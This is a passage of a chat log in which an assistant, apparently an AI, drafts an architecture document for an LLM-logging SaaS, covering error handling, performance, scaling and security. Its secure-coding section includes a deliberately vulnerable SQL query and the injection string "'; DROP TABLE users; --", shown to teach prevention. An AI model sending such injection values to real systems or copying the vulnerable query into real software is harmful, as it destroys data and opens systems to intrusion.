      toast.error('Limit exceeded. Please upgrade your plan.');
      return Promise.reject(error);
    }
    
    if (error.response?.status >= 500) {
      // Server error
      toast.error('Server error. Please try again later.');
      return Promise.reject(error);
    }
    
    // Other errors
    const message = error.response?.data?.message || 'An error occurred';
    toast.error(message);
    return Promise.reject(error);
  }
);

LAYER 2: Query Level
────────────────────────────────────────────────────────

// hooks/useRequests.ts
export function useRequests(projectId: string, filters: Filters) {
  return useQuery({
    queryKey: ['requests', projectId, filters],
    queryFn: async () => {
      const response = await api.get('/requests', {
        params: { projectId, ...filters }
      });
      return response.data;
    },
    onError: (error: any) => {
      // Query-specific error handling
      console.error('Failed to fetch requests:', error);
      
      // Optionally handle specific errors
      if (error.response?.status === 404) {
        toast.error('Project not found');
      }
    },
    retry: (failureCount, error: any) => {
      // Don't retry on 4xx errors
      if (error.response?.status >= 400 && error.response?.status < 500) {
        return false;
      }
      // Retry up to 3 times for network errors
      return failureCount < 3;
    }
  });
}

LAYER 3: Component Level
────────────────────────────────────────────────────────

// pages/Requests.tsx
export default function RequestsPage() {
  const { data, isLoading, error } = useRequests(projectId, filters);
  
  if (isLoading) {
    return <LoadingSpinner />;
  }
  
  if (error) {
    return (
      <ErrorState
        title="Failed to load requests"
        message="We couldn't fetch your request logs. Please try again."
        action={
          <Button onClick={() => refetch()}>
            Retry
          </Button>
        }
      />
    );
  }
  
  if (!data || data.length === 0) {
    return <EmptyState />;
  }
  
  return <RequestTable data={data} />;
}

LAYER 4: Error Boundary
────────────────────────────────────────────────────────

// components/ErrorBoundary.tsx
class ErrorBoundary extends React.Component {
  state = { hasError: false, error: null };
  
  static getDerivedStateFromError(error) {
    return { hasError: true, error };
  }
  
  componentDidCatch(error, errorInfo) {
    console.error('Error caught by boundary:', error, errorInfo);
    // Send to error tracking service (Sentry, etc.)
  }
  
  render() {
    if (this.state.hasError) {
      return (
        <div className="error-page">
          <h1>Something went wrong</h1>
          <p>We're sorry for the inconvenience.</p>
          <Button onClick={() => window.location.reload()}>
            Reload Page
          </Button>
        </div>
      );
    }
    
    return this.props.children;
  }
}

// App.tsx
<ErrorBoundary>
  <App />
</ErrorBoundary>`

## 11.2 Backend Error Handling

`BACKEND ERROR ARCHITECTURE
═══════════════════════════════════════════════════════════

ERROR CLASSES:
────────────────────────────────────────────────────────

// errors/AppError.ts
class AppError extends Error {
  statusCode: number;
  isOperational: boolean;
  
  constructor(message: string, statusCode: number) {
    super(message);
    this.statusCode = statusCode;
    this.isOperational = true;
  }
}

class ValidationError extends AppError {
  constructor(message: string) {
    super(message, 400);
  }
}

class UnauthorizedError extends AppError {
  constructor(message = 'Unauthorized') {
    super(message, 401);
  }
}

class ForbiddenError extends AppError {
  constructor(message = 'Forbidden') {
    super(message, 403);
  }
}

class NotFoundError extends AppError {
  constructor(message = 'Resource not found') {
    super(message, 404);
  }
}

class RateLimitError extends AppError {
  constructor(message = 'Rate limit exceeded') {
    super(message, 429);
  }
}

GLOBAL ERROR HANDLER:
────────────────────────────────────────────────────────

// middleware/errorHandler.ts
export const errorHandler = (err, req, res, next) => {
  // Log error
  console.error('[ERROR]', {
    message: err.message,
    stack: err.stack,
    url: req.url,
    method: req.method,
    userId: req.userId
  });
  
  // Operational errors (expected)
  if (err.isOperational) {
    return res.status(err.statusCode).json({
      error: err.message
    });
  }
  
  // Programming errors (unexpected)
  // Don't leak error details to client
  return res.status(500).json({
    error: 'Internal server error'
  });
};

// index.ts
app.use(errorHandler);  // Last middleware

USAGE IN CONTROLLERS:
────────────────────────────────────────────────────────

// controllers/project.controller.ts
export const getProject = async (req, res, next) => {
  try {
    const project = await prisma.project.findUnique({
      where: { id: req.params.id }
    });
    
    if (!project) {
      throw new NotFoundError('Project not found');
    }
    
    // Check ownership
    if (project.userId !== req.userId) {
      throw new ForbiddenError('Access denied');
    }
    
    res.json({ success: true, data: project });
    
  } catch (error) {
    next(error);  // Pass to error handler
  }
};

VALIDATION ERRORS:
────────────────────────────────────────────────────────

// middleware/validate.ts
import { z } from 'zod';

export const validate = (schema: z.ZodSchema) => {
  return (req, res, next) => {
    try {
      schema.parse(req.body);
      next();
    } catch (error) {
      if (error instanceof z.ZodError) {
        const errors = error.errors.map(e => ({
          field: e.path.join('.'),
          message: e.message
        }));
        
        return res.status(400).json({
          error: 'Validation failed',
          details: errors
        });
      }
      next(error);
    }
  };
};

// Usage:
const registerSchema = z.object({
  email: z.string().email(),
  password: z.string().min(8)
});

router.post('/register',
  validate(registerSchema),
  authController.register
);`

## 11.3 Edge Cases & Solutions

`CRITICAL EDGE CASES
═══════════════════════════════════════════════════════════

EDGE CASE 1: User Deletes Project While SDK is Logging
────────────────────────────────────────────────────────

Scenario:
  1. User has SDK running in production
  2. User deletes project in dashboard
  3. SDK tries to log requests with now-invalid API key

Solution:
  Backend:
    • Project deletion sets isActive = false (soft delete)
    • SDK requests return 403 "Project disabled"
    • Include message: "Project was deleted. Please update SDK."
  
  SDK:
    • Logs error to console
    • Stops trying to log
    • Doesn't break user's app

Prevention:
  • Show warning before deleting project:
    "⚠️ This project has an active API key.
     Deleting it will stop request logging.
     Are you sure?"

EDGE CASE 2: User Reaches Limit Mid-Request
────────────────────────────────────────────────────────

Scenario:
  1. User at 9,999 / 10,000 requests
  2. SDK sends batch of 5 requests

Solution:
  Backend processes requests sequentially:
    Request 1: 9,999 → 10,000 ✓ Logged
    Request 2: 10,000 → 10,001 ✗ Rejected (limit reached)
    Request 3-5: ✗ Rejected
  
  Return partial success:
    {
      success: false,
      message: "Limit exceeded",
      logged: 1,
      rejected: 4
    }
  
  SDK handles gracefully:
    • Logs warning for rejected requests
    • Doesn't retry rejected ones

EDGE CASE 3: Payment Fails During Active Usage
────────────────────────────────────────────────────────

Scenario:
  1. User on STARTER plan
  2. Payment fails on renewal date
  3. User is actively using dashboard

Solution:
  7-day grace period:
    Day 1-7:
      • subscriptionStatus = 'past_due'
      • User keeps STARTER features
      • Banner shown: "Payment failed. Update card within X days"
      • Can still log requests
    
    Day 8:
      • Automated downgrade to FREE
      • Extra projects disabled
      • Old data deleted
      • Email sent: "Your plan was downgraded"
  
  User experience:
    • No sudden service interruption
    • Clear warning and time to fix
    • Automatic fallback to free tier

EDGE CASE 4: User Upgrades Then Immediately Downgrades
────────────────────────────────────────────────────────

Scenario:
  1. User upgrades FREE → STARTER
  2. Creates 5 projects
  3. Same day, downgrades STARTER → FREE

Solution:
  Downgrade scheduled for next billing period:
    • User charged $19 for the month
    • Keeps STARTER features until billing date
    • On billing date, downgrade executes:
      - Must choose 1 project to keep
      - Other 4 disabled
      - Data older than 7 days deleted
  
  This prevents:
    • Immediate service loss after payment
    • Confusion about prorated refunds
    • Users gaming the system

EDGE CASE 5: Webhook Fails to Process
────────────────────────────────────────────────────────

Scenario:
  1. User upgrades, pays successfully
  2. Stripe sends webhook
  3. Our backend is down / webhook fails

Solution:
  Stripe retries webhooks:
    • Retry 1: 1 minute later
    • Retry 2: 5 minutes later
    • Retry 3: 30 minutes later
    • ... up to 3 days
  
  Our backend:
    • Idempotent webhook processing
    • Check if already processed (by Stripe event ID)
    • If already processed, return 200 OK
  
  Fallback:
    • Daily reconciliation job
    • Compares our DB with Stripe API
    • Fixes any discrepancies

EDGE CASE 6: Multiple Browser Tabs Open
────────────────────────────────────────────────────────

Scenario:
  1. User has dashboard open in 2 tabs
  2. Tab 1: User upgrades to STARTER
  3. Tab 2: Still shows FREE tier

Solution:
  localStorage events:
    // Tab 1: Updates auth store
    useAuthStore.getState().updateUser({ tier: 'STARTER' });
    
    // localStorage automatically synced
    
    // Tab 2: Listen for storage events
    window.addEventListener('storage', (e) => {
      if (e.key === 'auth-storage') {
        // Reload auth state from localStorage
        window.location.reload();
      }
    });
  
  Alternative:
    • Use BroadcastChannel API
    • Or simply rely on React Query refetch

EDGE CASE 7: Token Expires Mid-Session
────────────────────────────────────────────────────────

Scenario:
  1. User logged in 7 days ago
  2. Token expires
  3. User still has dashboard open

Solution:
  Axios interceptor catches 401:
    // lib/api.ts
    if (error.response?.status === 401) {
      useAuthStore.getState().logout();
      // Clears state, redirects to login
    }
  
  User sees:
    • Toast: "Session expired. Please login again."
    • Redirected to /login
    • Can log back in
    • Resume where they left off

EDGE CASE 8: Very Large Request Logs (10MB+ prompt)
────────────────────────────────────────────────────

Scenario:
  1. User sends 10MB document as prompt
  2. SDK tries to log it

Solution:
  SDK limits:
    if (prompt.length > 100000) {  // 100KB
      prompt = prompt.substring(0, 100000) + '... [truncated]';
    }
  
  Backend validation:
    if (req.body.prompt?.length > 100000) {
      return res.status(400).json({
        error: 'Prompt too large. Max 100KB.'
      });
    }
  
  Database:
    • prompt and response columns are TEXT (not unlimited)
    • PostgreSQL TEXT max: 1GB (more than enough)

EDGE CASE 9: User Tries to Access Deleted Project
────────────────────────────────────────────────────────

Scenario:
  1. User deletes project
  2. URL still bookmarked: /requests?projectId=deleted_id
  3. User visits bookmark

Solution:
  Frontend checks if project exists:
    const currentProject = useProjectStore(state => state.currentProject);
    const { data: projects } = useProjects();
    
    useEffect(() => {
      if (projectId && projects) {
        const exists = projects.find(p => p.id === projectId);
        if (!exists) {
          toast.error('Project not found');
          navigate('/dashboard');
        }
      }
    }, [projectId, projects]);

EDGE CASE 10: Concurrent Subscription Changes
────────────────────────────────────────────────────────

Scenario:
  1. User clicks "Upgrade to STARTER"
  2. While Stripe is processing...
  3. User clicks "Upgrade to PRO" in another tab

Solution:
  Frontend disables button after click:
    const [isProcessing, setIsProcessing] = useState(false);
    
    const handleUpgrade = async () => {
      setIsProcessing(true);
      try {
        await createCheckoutSession('STARTER');
      } finally {
        setIsProcessing(false);
      }
    };
    
    <Button disabled={isProcessing}>
      {isProcessing ? 'Processing...' : 'Upgrade'}
    </Button>
  
  Backend:
    • Stripe prevents concurrent checkouts for same customer
    • Second request returns existing checkout session

EDGE CASE 11: Database Connection Lost
────────────────────────────────────────────────────────

Scenario:
  Backend loses database connection

Solution:
  Connection pooling with retries:
    // Prisma automatically handles this
    
  Exponential backoff:
    • Retry connection after 1s, 2s, 4s, 8s...
  
  Health check endpoint:
    GET /health
    
    Checks:
      • Database connection
      • Stripe API availability
    
    Returns:
      {
        status: 'healthy' | 'degraded' | 'down',
        database: 'connected',
        stripe: 'connected'
      }
  
  If database down:
    • Return 503 Service Unavailable
    • Frontend shows maintenance message`

---

# 12. Performance & Scalability Design

## 12.1 Database Optimization

`DATABASE PERFORMANCE STRATEGY
═══════════════════════════════════════════════════════════

INDEXING STRATEGY:
────────────────────────────────────────────────────────

Critical Indexes (Already Covered):
  users:
    • email (unique)
    • subscriptionTier
    • stripeCustomerId

  projects:
    • userId
    • apiKey (unique)

  requests:
    • (projectId, timestamp DESC) - composite
    • status
    • timestamp DESC
    • (provider, model)

Why These Indexes:
  ✓ Cover all common query patterns
  ✓ Speed up JOINs
  ✓ Enable fast sorting
  ✓ Support pagination

QUERY OPTIMIZATION:
────────────────────────────────────────────────────────

Problem: Loading all project requests is slow
  SELECT * FROM requests
  WHERE projectId = 'proj_123'
  -- Could be 100K+ rows!

Solution: Pagination
  SELECT * FROM requests
  WHERE projectId = 'proj_123'
  ORDER BY timestamp DESC
  LIMIT 50
  OFFSET 0
  -- Only loads 50 rows

Better: Cursor-based pagination
  SELECT * FROM requests
  WHERE projectId = 'proj_123'
    AND timestamp < '2024-02-09T12:00:00Z'
  ORDER BY timestamp DESC
  LIMIT 50
  -- Faster than OFFSET

Problem: Dashboard stats query is slow
  SELECT 
    COUNT(*) as total_requests,
    SUM(totalCost) as total_cost,
    AVG(latencyMs) as avg_latency
  FROM requests
  WHERE projectId = 'proj_123'
  -- Scans all rows

Solution: Materialized views or caching
  Store aggregated stats in separate table:
    project_stats:
      projectId
      date
      request_count
      total_cost
      avg_latency
  
  Update daily via scheduled job
  Dashboard queries this table instead

Problem: Fetching large TEXT fields
  SELECT * FROM requests  -- Includes prompt and response
  
  If response is 10KB, loading 50 rows = 500KB

Solution: Select only needed columns
  List view:
    SELECT id, timestamp, model, totalCost, status
    FROM requests
    LIMIT 50
    -- Prompt and response not loaded
  
  Detail view:
    SELECT * FROM requests
    WHERE id = 'req_123'
    -- Only loads one full record

CONNECTION POOLING:
────────────────────────────────────────────────────────

Prisma handles this automatically

Configuration:
  datasource db {
    provider = "postgresql"
    url      = env("DATABASE_URL")
  }

DATABASE_URL format:
  postgresql://user:pass@host:5432/db?connection_limit=20

Limits:
  • Max 20 concurrent connections
  • Prevents database overload
  • Queues requests if all connections busy

DATA ARCHIVAL:
────────────────────────────────────────────────────────

Problem: Database grows indefinitely

Solution: Archive old data
  Monthly job:
    1. Export requests older than retention period to S3
    2. Delete from main database
    3. Keep archive accessible via separate API
  
  Database stays small and fast
  Old data still available if needed`

## 12.2 API Performance

`API OPTIMIZATION TECHNIQUES
═══════════════════════════════════════════════════════════

RATE LIMITING:
────────────────────────────────────────────────────────

Prevent abuse and ensure fair usage

Implementation:
  // middleware/rateLimiter.ts
  import rateLimit from 'express-rate-limit';
  
  export const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,  // 15 minutes
    max: 100,  // 100 requests per window
    message: 'Too many requests, please try again later'
  });
  
  // Apply to all API routes
  app.use('/api/', apiLimiter);

SDK-specific limiter:
  export const sdkLimiter = rateLimit({
    windowMs: 60 * 1000,  // 1 minute
    max: 1000,  // 1000 requests per minute per IP
    keyGenerator: (req) => req.headers['x-api-key']
  });
  
  app.use('/api/sdk-log', sdkLimiter);

RESPONSE COMPRESSION:
────────────────────────────────────────────────────────

Reduce bandwidth usage

  import compression from 'compression';
  
  app.use(compression());
  
  // Automatically gzip responses
  // 10KB response → 2KB gzipped
  // Faster transfers, lower costs

CACHING:
────────────────────────────────────────────────────────

Cache expensive queries

Example: Dashboard stats
  // Cache stats for 5 minutes
  const cacheKey = `stats:${projectId}:${dateRange}`;
  
  let stats = cache.get(cacheKey);
  
  if (!stats) {
    stats = await calculateStats(projectId, dateRange);
    cache.set(cacheKey, stats, 300);  // 5 minutes TTL
  }
  
  return stats;

Cache invalidation:
  • When new request logged → invalidate project stats
  • When user upgrades → invalidate user data
  • When project deleted → invalidate project data

ASYNC PROCESSING:
────────────────────────────────────────────────────────

Don't block API responses

SDK logging:
  POST /api/sdk-log
    ↓
  Validate request (fast)
    ↓
  Add to queue (fast)
    ↓
  Return 200 OK immediately
    ↓
  Background worker processes queue
    ↓
  Inserts into database

Benefits:
  • Fast API response (< 50ms)
  • Can handle burst traffic
  • Database writes batched

DATABASE CONNECTION REUSE:
────────────────────────────────────────────────────────

Don't create new connection per request

Prisma Client singleton:
  // lib/prisma.ts
  let prisma;
  
  if (process.env.NODE_ENV === 'production') {
    prisma = new PrismaClient();
  } else {
    // In development, prevent too many connections
    if (!global.prisma) {
      global.prisma = new PrismaClient();
    }
    prisma = global.prisma;
  }
  
  export default prisma;

Reuse same connection across requests`

## 12.3 Frontend Performance

`FRONTEND OPTIMIZATION
═══════════════════════════════════════════════════════════

CODE SPLITTING:
────────────────────────────────────────────────────────

Don't load entire app upfront

Lazy load routes:
  import { lazy, Suspense } from 'react';
  
  const Dashboard = lazy(() => import('./pages/Dashboard'));
  const Requests = lazy(() => import('./pages/Requests'));
  const Settings = lazy(() => import('./pages/Settings'));
  
  <Routes>
    <Route path="/dashboard" element={
      <Suspense fallback={<LoadingSpinner />}>
        <Dashboard />
      </Suspense>
    } />
  </Routes>

Result:
  • Initial bundle: 50KB
  • Dashboard chunk: 30KB (loaded on demand)
  • Requests chunk: 25KB (loaded on demand)
  • Total if all visited: 105KB
  • But most users don't visit all pages!

VIRTUAL SCROLLING:
────────────────────────────────────────────────────────

For large lists (1000+ items)

Without virtualization:
  • Render all 1000 rows
  • DOM has 1000 elements
  • Slow, laggy scrolling

With virtualization:
  • Only render visible rows (~20)
  • DOM has 20 elements
  • Fast, smooth scrolling

Implementation:
  import { useVirtualizer } from '@tanstack/react-virtual';
  
  const virtualizer = useVirtualizer({
    count: requests.length,
    getScrollElement: () => parentRef.current,
    estimateSize: () => 50  // Row height
  });
  
  // Only render visible items
  {virtualizer.getVirtualItems().map(item => (
    <RequestRow key={item.key} request={requests[item.index]} />
  ))}

DEBOUNCING SEARCH:
────────────────────────────────────────────────────────

Don't search on every keystroke

  const [searchTerm, setSearchTerm] = useState('');
  const [debouncedSearch, setDebouncedSearch] = useState('');
  
  useEffect(() => {
    const timer = setTimeout(() => {
      setDebouncedSearch(searchTerm);
    }, 500);  // Wait 500ms after typing stops
    
    return () => clearTimeout(timer);
  }, [searchTerm]);
  
  // Use debouncedSearch in API call
  const { data } = useRequests(projectId, { search: debouncedSearch });

Result:
  • User types: "hello"
  • Only 1 API call after 500ms
  • Not 5 calls (one per letter)

MEMOIZATION:
────────────────────────────────────────────────────────

Avoid unnecessary re-calculations

  import { useMemo } from 'react';
  
  const expensiveRequests = useMemo(() => {
    return requests
      .filter(r => r.totalCost > 1.0)
      .sort((a, b) => b.totalCost - a.totalCost);
  }, [requests]);  // Only recalculate when requests change

Without memo:
  • Recalculates on every render
  • Even if requests didn't change

With memo:
  • Only recalculates when dependencies change
  • Much faster

IMAGE OPTIMIZATION:
────────────────────────────────────────────────────────

Use modern formats:
  • WebP instead of PNG/JPG (30% smaller)
  • SVG for icons (scalable, tiny)

Lazy load images:
  <img 
    src="chart.png"
    loading="lazy"  // Only loads when scrolled into view
    alt="Chart"
  />

BUNDLE ANALYSIS:
────────────────────────────────────────────────────────

Find what's making bundle large

  npm run build
  npx vite-bundle-visualizer

Shows:
  • Which packages are largest
  • What to optimize
  • Unexpected large dependencies

Common culprits:
  • Moment.js (use date-fns instead)
  • Lodash (import specific functions)
  • Unused dependencies`

## 12.4 Scalability Considerations

`SCALING STRATEGY
═══════════════════════════════════════════════════════════

CURRENT ARCHITECTURE (Single Server):
────────────────────────────────────────────────────────

┌──────────────┐
│   Frontend   │ (Vercel)
└──────┬───────┘
       │
       ↓
┌──────────────┐
│   Backend    │ (Railway - 1 instance)
└──────┬───────┘
       │
       ↓
┌──────────────┐
│   Database   │ (Supabase)
└──────────────┘

Handles:
  • ~10,000 requests/day
  • ~100 concurrent users
  • ~1GB database

HORIZONTAL SCALING (Multiple Servers):
────────────────────────────────────────────────────────

When traffic grows 10x:

┌──────────────┐
│   Frontend   │ (Vercel - auto-scales)
└──────┬───────┘
       │
       ↓
┌──────────────┐
│ Load Balancer│ (Distribute requests)
└──────┬───────┘
       │
       ├───────┬───────┬───────┐
       ↓       ↓       ↓       ↓
   Backend  Backend Backend Backend
   Instance Instance Instance Instance
    (1)      (2)     (3)     (4)
       │       │       │       │
       └───────┴───────┴───────┘
                  ↓
           ┌──────────────┐
           │   Database   │
           └──────────────┘

Benefits:
  • Can handle 40,000 requests/day
  • If one instance crashes, others handle load
  • Can add more instances as needed

DATABASE SCALING:
────────────────────────────────────────────────────────

Read Replicas:
  • Master database (writes)
  • Replica databases (reads only)
  • Most queries are reads (90%+)

┌─────────────┐
│   Master    │ ← Writes (INSERT, UPDATE, DELETE)
│  (Primary)  │
└──────┬──────┘
       │ Replication
       ├────────┬────────┐
       ↓        ↓        ↓
   Replica  Replica  Replica
    (1)      (2)      (3)
       ↑        ↑        ↑
       └────────┴────────┘
         Reads (SELECT)

Implementation:
  // Prisma config
  datasource db {
    provider = "postgresql"
    url      = env("DATABASE_URL")          // Master
  }
  
  datasource dbRead {
    provider = "postgresql"
    url      = env("DATABASE_READ_URL")     // Replica
  }
  
  // Use read replica for queries
  const requests = await prismaRead.request.findMany();
  
  // Use master for writes
  const newRequest = await prisma.request.create();

CACHING LAYER:
────────────────────────────────────────────────────────

Add Redis for frequently accessed data

┌──────────────┐
│   Backend    │
└──────┬───────┘
       │
       ├─────────┬─────────┐
       ↓         ↓         ↓
   ┌─────┐  ┌─────────┐  ┌─────────┐
   │Redis│  │Database │  │Database │
   │Cache│  │(Master) │  │(Replica)│
   └─────┘  └─────────┘  └─────────┘

Flow:
  1. Check Redis for data
  2. If found (cache hit) → return immediately
  3. If not found (cache miss) → query database
  4. Store result in Redis for next time

Use cases:
  • User sessions
  • Dashboard stats (5 min cache)
  • Project list (1 hour cache)
  • Pricing data (24 hour cache)

QUEUE SYSTEM:
────────────────────────────────────────────────────────

For async/background jobs

┌──────────────┐
│   Backend    │
└──────┬───────┘
       │
       ↓
┌──────────────┐
│  Job Queue   │ (Bull / BullMQ)
│   (Redis)    │
└──────┬───────┘
       │
       ↓
┌──────────────┐
│   Workers    │ (Process jobs)
│   (1, 2, 3)  │
└──────────────┘

Jobs:
  • Send emails
  • Process webhooks
  • Generate reports
  • Clean old data
  • Calculate analytics

CDN FOR FRONTEND:
────────────────────────────────────────────────────────

Vercel automatically provides this

Benefits:
  • Static files served from edge locations
  • User in Tokyo gets files from Tokyo server
  • User in London gets files from London server
  • Much faster than single origin server

MONITORING & ALERTS:
────────────────────────────────────────────────────────

Know when something breaks

Tools:
  • Sentry (error tracking)
  • Uptime Robot (uptime monitoring)
  • New Relic / Datadog (performance monitoring)

Alerts:
  • Email if error rate > 5%
  • Slack if server is down
  • SMS if database connection lost

COST OPTIMIZATION:
────────────────────────────────────────────────────────

Scale smartly to control costs

Strategies:
  • Auto-scale: Add instances during peak, remove during off-peak
  • Spot instances: Use cheaper compute for background jobs
  • Database: Start small, upgrade when needed
  • CDN: Free tier often sufficient for small apps
  • Monitoring: Free tiers (Sentry: 5K errors/month free)

Expected costs at scale:
  1,000 users:
    • Backend: $20/month (Railway)
    • Database: $25/month (Supabase Pro)
    • Total: ~$45/month
  
  10,000 users:
    • Backend: $100/month (multiple instances)
    • Database: $100/month (larger database)
    • Redis: $20/month
    • Monitoring: $50/month
    • Total: ~$270/month
  
  Still profitable with 250 paying users ($19/mo each = $4,750 MRR)`

---

**This document continues to be extremely comprehensive. I've now covered:**

1. ✅ System Architecture
2. ✅ Subscription & Monetization
3. ✅ User Flows
4. ✅ Data Flow Architecture
5. ✅ Core Features
6. ✅ Database Design
7. ✅ Authentication
8. ✅ Payment Integration
9. ✅ Admin Panel
10. ✅ State Management
11. ✅ Error Handling
12. ✅ Performance & Scalability

**Remaining sections:**
13. Security Architecture
14. Development Workflow

**Shall I complete these final two sections?** 🚀

yes

5:36 PM

Orchestrated completion of architectural documentation sections

The user wants me to continue and complete the remaining two sections:
13. Security Architecture
14. Development Workflow

Let me provide comprehensive, detailed coverage of these topics in the same architectural and flow-based style I've been using throughout this document.

Done

# 📘 **COMPLETE TECHNICAL PLANNING & ARCHITECTURE DOCUMENT** (Final Sections)

---

# 13. Security Architecture

## 13.1 Security Layers Overview

`MULTI-LAYER SECURITY APPROACH
═══════════════════════════════════════════════════════════

LAYER 1: Network Security
  ├─ HTTPS/TLS for all communications
  ├─ CORS configuration
  ├─ Rate limiting
  └─ DDoS protection (Cloudflare/Vercel)

LAYER 2: Authentication
  ├─ Strong password requirements
  ├─ Bcrypt hashing (10 salt rounds)
  ├─ JWT tokens (7-day expiry)
  └─ API key authentication for SDK

LAYER 3: Authorization
  ├─ Role-based access (admin vs user)
  ├─ Resource ownership checks
  ├─ Feature gating by subscription tier
  └─ Project-level isolation

LAYER 4: Input Validation
  ├─ Zod schemas on all inputs
  ├─ SQL injection prevention (Prisma ORM)
  ├─ XSS protection
  └─ CSRF protection

LAYER 5: Data Security
  ├─ Encrypted connections (DATABASE_URL with SSL)
  ├─ Sensitive data encryption at rest
  ├─ Payment data handled by Stripe (PCI compliant)
  └─ Regular backups

LAYER 6: Application Security
  ├─ Dependencies security scanning
  ├─ Environment variable protection
  ├─ Secure session management
  └─ Error message sanitization`

## 13.2 Authentication Security

`PASSWORD SECURITY
═══════════════════════════════════════════════════════════

PASSWORD REQUIREMENTS:
────────────────────────────────────────────────────────

Frontend validation:
  • Minimum 8 characters
  • At least 1 uppercase letter (optional but recommended)
  • At least 1 number (optional but recommended)
  • No maximum length (but reasonable limit like 128)

Registration flow:
  User enters: "MyP@ssw0rd123"
      ↓
  Frontend validates length
      ↓
  Sends to backend (over HTTPS)
      ↓
  Backend hashes:
    const hash = await bcrypt.hash(password, 10);
    // Result: "$2b$10$N9qo8uLOickgx2ZMRZoMye..."
      ↓
  Stores hash in database (NEVER plain password)
      ↓
  Original password discarded

LOGIN SECURITY:
────────────────────────────────────────────────────────

Login attempt flow:
  User submits email + password
      ↓
  Backend finds user by email
      ↓
  Backend compares:
    const isValid = await bcrypt.compare(
      inputPassword,
      user.passwordHash
    );
      ↓
  If invalid:
    • Return generic error: "Invalid credentials"
    • Don't reveal if email exists or password wrong
    • Log failed attempt
    • After 5 failed attempts: temporary lockout (15 min)
      ↓
  If valid:
    • Generate JWT
    • Return token

BRUTE FORCE PROTECTION:
────────────────────────────────────────────────────────

Track login attempts:
  // In-memory or Redis
  loginAttempts = {
    'user@example.com': {
      count: 3,
      lastAttempt: timestamp,
      lockedUntil: null
    }
  }

Logic:
  On failed login:
    • Increment count
    • If count >= 5:
      - Set lockedUntil = now + 15 minutes
      - Return: "Too many attempts. Try again in 15 minutes."
  
  On successful login:
    • Reset count to 0

Additional protection:
  • Rate limit: Max 10 login attempts per IP per minute
  • CAPTCHA after 3 failed attempts (future enhancement)

JWT TOKEN SECURITY:
────────────────────────────────────────────────────────

Token generation:
  const token = jwt.sign(
    {
      userId: user.id,
      subscriptionTier: user.subscriptionTier,
      iat: Math.floor(Date.now() / 1000)  // Issued at
    },
    process.env.JWT_SECRET,  // Long random string
    {
      expiresIn: '7d',
      algorithm: 'HS256'
    }
  );

JWT_SECRET requirements:
  • At least 32 characters
  • Random, unpredictable
  • Never committed to git
  • Different for dev/prod
  • Rotated periodically (every 90 days)

Token verification:
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    // Token is valid
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      // Token expired - user must login
    } else if (error.name === 'JsonWebTokenError') {
      // Token invalid - possible tampering
    }
    throw new UnauthorizedError();
  }

TOKEN STORAGE (Frontend):
────────────────────────────────────────────────────────

Where to store:
  ✓ localStorage (we use this)
    Pros: Persists across tabs, simple
    Cons: Vulnerable to XSS
  
  ✗ Cookie (httpOnly)
    Pros: More secure (not accessible via JS)
    Cons: Vulnerable to CSRF, complex setup
  
  ✗ sessionStorage
    Pros: Cleared on tab close
    Cons: Lost on refresh, doesn't persist

Our choice: localStorage with XSS protection

XSS protection:
  • Sanitize all user inputs
  • Use React (auto-escapes by default)
  • Content Security Policy headers
  • Don't use dangerouslySetInnerHTML

PASSWORD RESET FLOW:
────────────────────────────────────────────────────────

User clicks "Forgot password"
      ↓
[Reset Password Page]
  Email: _______________
  [Send Reset Link]
      ↓
Backend:
  1. Find user by email
  2. Generate reset token:
     resetToken = randomBytes(32).toString('hex')
     hashedToken = crypto.createHash('sha256')
       .update(resetToken)
       .digest('hex')
  
  3. Store in database:
     UPDATE users SET
       passwordResetToken = hashedToken,
       passwordResetExpires = NOW() + INTERVAL '1 hour'
     WHERE id = userId
  
  4. Send email:
     Link: https://observeai.com/reset-password?token=...
      ↓
User clicks link
      ↓
[Reset Password Form]
  New Password: _______________
  Confirm Password: _______________
  [Reset Password]
      ↓
Backend:
  1. Hash provided token
  2. Find user by hashed token
  3. Check if token expired
  4. If valid:
     - Hash new password
     - Update user.passwordHash
     - Clear passwordResetToken
     - Invalidate all existing JWT tokens (optional)
  5. Send confirmation email

Security considerations:
  • Token valid for 1 hour only
  • Token used once (single-use)
  • Token not guessable (32 random bytes)
  • Original token never stored (only hash)`

## 13.3 API Security

`API PROTECTION STRATEGIES
═══════════════════════════════════════════════════════════

CORS CONFIGURATION:
────────────────────────────────────────────────────────

Restrict which domains can call API:

  import cors from 'cors';
  
  app.use(cors({
    origin: [
      'https://observeai.com',
      'https://www.observeai.com',
      'https://admin.observeai.com',
      'http://localhost:5173'  // Dev only
    ],
    credentials: true,  // Allow cookies
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-API-Key']
  }));

Prevents:
  • Malicious sites from calling our API
  • CSRF attacks from random websites

HELMET.JS (Security Headers):
────────────────────────────────────────────────────────

Adds security headers to all responses:

  import helmet from 'helmet';
  
  app.use(helmet());

Headers added:
  • X-Content-Type-Options: nosniff
    → Prevents MIME type sniffing
  
  • X-Frame-Options: DENY
    → Prevents clickjacking
  
  • X-XSS-Protection: 1; mode=block
    → Enables browser XSS filter
  
  • Strict-Transport-Security: max-age=31536000
    → Forces HTTPS
  
  • Content-Security-Policy
    → Restricts resource loading

RATE LIMITING:
────────────────────────────────────────────────────────

Prevent abuse and DoS attacks:

General API:
  • 100 requests per 15 minutes per IP
  • Applies to all /api/* routes

SDK endpoint:
  • 1000 requests per minute per API key
  • Higher limit for legitimate usage

Authentication:
  • 10 login attempts per minute per IP
  • 5 failed attempts per email → 15 min lockout

Implementation:
  const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    message: {
      error: 'RATE_LIMIT_EXCEEDED',
      message: 'Too many requests, please try again later'
    },
    standardHeaders: true,  // Return rate limit info in headers
    legacyHeaders: false
  });

Response headers:
  X-RateLimit-Limit: 100
  X-RateLimit-Remaining: 87
  X-RateLimit-Reset: 1675943256

INPUT VALIDATION:
────────────────────────────────────────────────────────

NEVER trust client input

Validation with Zod:
  const createProjectSchema = z.object({
    name: z.string()
      .min(1, 'Name is required')
      .max(100, 'Name too long')
      .regex(/^[a-zA-Z0-9\s-_]+$/, 'Invalid characters')
  });

SQL injection prevention:
  ✗ BAD (vulnerable):
    const user = await db.query(
      `SELECT * FROM users WHERE email = '${email}'`
    );
    // If email = "'; DROP TABLE users; --"
    // → SQL injection!
  
  ✓ GOOD (safe with Prisma):
    const user = await prisma.user.findUnique({
      where: { email: email }
    });
